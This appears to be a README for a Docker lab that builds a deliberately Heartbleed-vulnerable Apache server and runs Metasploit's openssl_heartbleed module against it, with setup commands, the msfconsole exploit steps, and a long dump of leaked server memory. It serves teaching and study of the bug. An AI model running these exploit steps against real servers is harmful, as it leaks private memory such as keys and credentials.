# dockerized-heartbleed-scenario
Skeleton of the OpenSSL heartbleed bug in the docker environment.

## Local prerequisites

Running a webserver with SSL requires you to generate a self signed certificate like this:

```bash
# create certificates
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout server.key -out server.crt
```

## First image: let's meet the exploit ;-)

The [metasploitframework](https://www.metasploit.com/) contain a Ruby implementation which is able to exploit the OpenSSL heartbeat memory allocation bug. See https://www.rapid7.com/db/modules/auxiliary/scanner/ssl/openssl_heartbleed for more information.

Pull the docker image and run it:

```bash
docker pull metasploitframework/metasploit-framework
docker run -it --rm metasploitframework/metasploit-framework
```

## Second image: your vulnerable Apache web server

At this time the cloned repository contains these 3 files:

```
|
|- Dockerfile
|- server.crt
|- server.key
```

Let's build the image:

```bash
docker build --tag=opensslheartbleed .
```

Now, execute it:

```bash
docker run --name heartbleed -p 80:80 opensslheartbleed
```

## Post-installation steps

Before we can watch the exploit in action we (probably) need to copy the certificate to the OpenSSL heartblead container in order to accept it:

```bash
# Detect the container ID of metasploitframework:
docker ps

# Shows something like this; you will need the container ID (here: 6354a564f347)
6354a564f347   metasploitframework/metasploit-framework "docker/entrypoint.sâ€¦" 8 hours ago  Up 8 hours suspicious_shtern

# Copy the generated certificate into the running metasploit container:
docker cp server.crt 6354a564f347:/usr/local/share/ca-certificates/server.crt

# Enter the container:
docker exec -it 6354a564f347 bash

# Update certificates:
update-ca-certificates
```

Now, let's detect the IP address of the vulnerable Apache container:

```bash
# let's say this issues '172.17.0.3'
docker inspect heartbleed | grep IPAddress | grep -o -E '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'
```

## Test in the metasploit interface:

Switch to the metaspoint container and execute the following steps. This will exploit the vulnerability of the OpenSSL running on `172.17.0.3`:

```bash
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS 172.17.0.3
set verbose true
run
```

Now, you should see the leaked data:

```
...
[*] 172.17.0.3:443        - Sending Heartbeat...
[*] 172.17.0.3:443        - Heartbeat response, 65535 bytes
[+] 172.17.0.3:443        - Heartbeat response with leak, 65535 bytes
[*] 172.17.0.3:443        - Printable info leaked:
......\O...A.6..B6cs...A.wu....pN'k.v...f.....".!.9.8.........5.............................3.2.....E.D...../...A..................................................................................................................................... repeated 16008 times .....................................................................................................................................@..................................................................................................................................... repeated 16122 times .....................................................................................................................................@.................................................................................................................................................................................................................................................................................................................................e@.....................A... j.....Zq....sQ@..S.I..aO....yJ...x...<.N.,....i.}L....D?.<.....mrq^`{8.B.......N..>._...D...".....z.Of..;..F.....)(..d...Ef......l).|.....;..wc....xXJ..Z....j%.u.B]Sx<.V.k...z]+<..H.5.qt......p...R...A..R..!.oa...g9..rP.:.....2.q=.\......Uu...Z.p.'....._}.S..d.d3b..YH;..5....H..5.[i.g..K..wL....s:b..D...J......=..9._nz.T...=...>2y.:...^..l_8q8"a.r.f.A.y..I.8..Xp..8.)].}An.h...v.5f9nd.6h..b%../(....o(..$ym..r*=k.>x........l.z..P#._....4k.R@........t......T.kFQ..'.l=.bY!.........n&F.Gt.~..A9)8.$.......>........P0N0...U.........8...;|...6...E.P.0...U.#..0......8...;|...6...E.P.0...U....0....0...*.H................ .J...a...9.%M..3Z.~...r.!.&f"..........D[m..../8..X&^.....3C..j;.{.0w.. ..F.....<+m../\v...[..LGx._D......F..a{...P.%0.?...ur....L....In...kV.5.;..]rv.D..e..T..N.3..[.......... .Sb.M..%.z# .,...G...81.CT....,Um.z`..).....,h......Y..4p....:.u.......W5..................................................................................................................................... repeated 7573 times .....................................................................................................................................W...............................5........9......................................! ......x.......pj..................................................................................................................................... repeated 3852 times .....................................................................................................................................}.....z.f....(~.n....\..e-. ..........`..M(.....wF.7..`L...2...................s...o..l..i0..e0..M................0...*.H........0I1.0...U....AU1.0...U....Vienna1.0...U....Vienna1.0...U....KG1.0...U....KG0...190125162443Z..200125162443Z0I1.0...U....AU1.0...U....Vienna1.0...U....Vienna1.0...U....KG1.0...U....KG0.."0...*.H.............0................7.....,.v.........1..1n}...*...... ]oZL.q2.....h<..."...6F.z.T...=...>2y.:...^..l_8q8"a.r.f.A.y..I.8..Xp..8.)].}An.h...v.5f9nd.6h..b%../(....o(..$ym..r*=k.>x........l.z..P#._....4k.R@........t......T.kFQ..'.l=.bY!.........n&F.Gt.~..A9)8.$.......>........P0N0...U.........8...;|...6...E.P.0...U.#..0......8...;|...6...E.P.0...U....0....0...*.H................ .J...a...9.%M..3Z.~...r.!.&f"..........D[m..../8..X&^.....3C..j;.{.0w.. ..F.....<+m../\v...[..LGx._D......F..a{...P.%0.?...ur....L....In...kV.5.;..]rv.D..e..T..N.3..[.......... .Sb.M..%.z# .,...G...81.CT....,Um.z`..).....,h......Y..4p....:.u.......W5......K...G...A..'...p.^.e...Y&.z...d"..c......B.\.L[s...g.......q/..w....-..|.C.. b..q.......%v~.T-.F;q.?.u.{.ZS.........D.0..*BJ...n..F...M...R...P..{ ...2v..t..7..q.p I\./PNb.+.uE+wB.#........o.Mv.zQ.c.............z..U#Z.T+..T..Cr).....k.....uv...........f."..u.iXd....J...y....%.D._#...a.j.n.r.^..t...........|!~....w....A....F..................................................................................................................................... repeated 1557 times .....................................................................................................................................@..................................................................................................................................... repeated 152 times ..................................................................................................................................... ......0.......0.......................0........p.......................q.......................p................(t.U..........m.Ct.U..0.......0................................3.2.....E.D...../...A..................................................................................................................................... repeated 7840 times .....................................................................................................................................W...............................5........9......................................! ......x.......pj..................................................................................................................................... repeated 3852 times .....................................................................................................................................}.....z.f....(~.n....\..e-. ..........`..M(.....wF.7..`L...2...................s...o..l..i0..e0..M................0...*.H........0I1.0...U....AU1.0...U....Vienna1.0...U....Vienna1.0...U....KG1.0...U....KG0...190125162443Z..200125162443Z0I1.0...U....AU1.0...U....Vienna1.0...U....Vienna1.0...U....KG1.0...U....KG0.."0...*.H.............0................7.....,.v.........1..1n}...*...... ]oZL.q2.....h<..."...6F.z.T...=...>2y.:...^..l_8q8"a.r.f.A.y..I.8..Xp..8.)].}An.h...v.5f9nd.6h..b%../(....o(..$ym..r*=k.>x........l.z..P#._....4k.R@........t......T.kFQ..'.l=.bY!.........n&F.Gt.~..A9)8.$.......>........P0N0...U.........8...;|...6...E.P.0...U.#..0......8...;|...6...E.P.0...U....0....0...*.H................ .J...a...9.%M..3Z.~...r.!.&f"..........D[m..../8..X&^.....3C..j;.{.0w.. ..F.....<+m../\v...[..LGx._D......F..a{...P.%0.?...ur....L....In...kV.5.;..]rv.D..e..T..N.3..[.......... .Sb.M..%.z# .,...G...81.CT....,Um.z`..).....,h......Y..4p....:.u.......W5......K...G...A..'...p.^.e...Y&.z...d"..c......B.\.L[s...g.......q/..w....-..|.C.. b..q.......%v~.T-.F;q.?.u.{.ZS.........D.0..*BJ...n..F...M...R...P..{ ...2v..t..7..q.p I\./PNb.+.uE+wB.#........o.Mv.zQ.c.............z..U#Z.T+..T..Cr).....k.....uv...........f."..u.iXd....J...y....%.D._#...a.j.n.r.^..t...........|!~....w....A....F..................................................................................................................................... repeated 1874 times .....................................................................................................................................
[*] 172.17.0.3:443        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssl/openssl_heartbleed) >
```